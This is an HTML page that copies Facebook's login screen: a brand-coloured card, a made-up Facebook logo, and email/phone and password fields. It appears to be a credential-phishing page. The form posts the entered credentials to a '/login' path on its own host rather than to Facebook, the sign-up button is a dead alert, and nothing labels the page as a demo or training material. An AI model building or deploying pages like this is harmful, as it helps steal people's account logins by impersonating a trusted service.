<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #fff;
            padding: 20px 28px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo svg {
            width: 240px;
            height: auto;
        }
        .form-group {
            margin-bottom: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            background: #f5f6f7;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #1877f2;
            background: #fff;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 4px;
        }
        .login-btn:hover {
            background: #166fe5;
        }
        .links {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
        }
        .links a {
            color: #1877f2;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .divider {
            margin: 20px 0;
            border-top: 1px solid #dadde1;
        }
        .signup-btn {
            width: 100%;
            padding: 14px;
            background: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s;
        }
        .signup-btn:hover {
            background: #36a420;
        }
        .forgot-link {
            display: block;
            margin-top: 12px;
        }
        .error-msg {
            color: #f02849;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 16px;
                margin: 10px;
            }
            .logo svg {
                width: 180px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 300 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="42" font-family="Arial, Helvetica, sans-serif" font-size="40" font-weight="900" fill="#1877f2">Facebook</text>
                <circle cx="20" cy="30" r="8" fill="#1877f2"/>
                <circle cx="20" cy="20" r="6" fill="#fff"/>
            </svg>
        </div>
        <form id="loginForm" method="POST" action="/login">
            <div class="form-group">
                <input type="text" name="email" placeholder="Email address or phone number" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
            <div class="links">
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
        </form>
        <div class="divider"></div>
        <button class="signup-btn" onclick="alert('Sign up functionality is currently unavailable')">Create new account</button>
        <div style="text-align:center; margin-top:16px; font-size:13px; color:#8a8d91;">
            <a href="#" style="color:#8a8d91; text-decoration:none;">Create a Page</a> for a celebrity, brand or business.
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = this.querySelector('.login-btn');
            btn.textContent = 'Logging in...';
            btn.disabled = true;
        });
    </script>
</body>
</html>
